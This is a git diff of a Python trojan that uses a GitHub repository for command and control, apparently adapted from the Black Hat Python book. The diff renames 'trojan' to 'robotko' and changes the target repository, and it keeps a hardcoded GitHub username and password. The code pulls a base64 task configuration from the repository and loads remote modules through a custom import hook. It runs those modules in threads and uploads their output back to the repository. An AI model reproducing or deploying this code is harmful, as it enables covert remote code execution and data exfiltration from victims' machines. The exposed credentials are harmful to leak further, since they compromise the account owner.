@@ -6,15 +6,15 @@ from github3 import login
 GH_USERNAME = 'unsecur3'
 GH_PASSWORD = 'wNJL4u8#%ZHF'
 OWNER = 'iluxonchik'
-REPOSITORY = 'blackhat-python-book'
+REPOSITORY = 'robotko'
 BRANCH = 'master'
 ######################################
 
-trojan_id = "abc"  # unique id for this trojan
-relative_path = "Chapter_07/trojan/"
-trojan_config = relative_path + "config/{0}.json".format(trojan_id)
-data_path = relative_path + "data/{0}/".format(trojan_id)
-trojan_modules = []
+robotko_id = "abc"  # unique id for this robotko
+relative_path = "robotko/"
+robotko_config = relative_path + "config/{0}.json".format(robotko_id)
+data_path = relative_path + "data/{0}/".format(robotko_id)
+robotko_modules = []
 configured = False
 task_queue = Queue()
 
@@ -37,9 +37,9 @@ def get_file_contents(filepath):
 			return blob.content
 	return None
 
-def get_trojan_config():
+def get_robotko_config():
 	global configured
-	config_json = get_file_contents(trojan_config)
+	config_json = get_file_contents(robotko_config)
 	config = json.loads(base64.b64decode(config_json).decode(encoding="utf-8"))
 	configured = True
 
@@ -50,8 +50,8 @@ def get_trojan_config():
 
 def store_module_result(data):
 	gh, repo, branch = connect_to_github()
-	remote_path = relative_path + "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 1000000))
-	repo.create_file(remote_path, "[Trojan {0}] Adding data".format(trojan_id), data.encode("utf-8"))
+	remote_path = relative_path + "data/{0}/{1}.data".format(robotko_id, random.randint(1000, 1000000))
+	repo.create_file(remote_path, "[robotko {0}] Adding data".format(robotko_id), data.encode("utf-8"))
 
 class GitImporter(object):
 	def __init__(self):
@@ -84,10 +84,10 @@ def module_runner(module):
 
 sys.meta_path += [GitImporter()]
 
-# main trojan loop
+# main robotko loop
 while True:
 	if task_queue.empty():
-		config = get_trojan_config()
+		config = get_robotko_config()
 
 		for task in config:
 			t = threading.Thread(target=module_runner, args=(task['module'],))
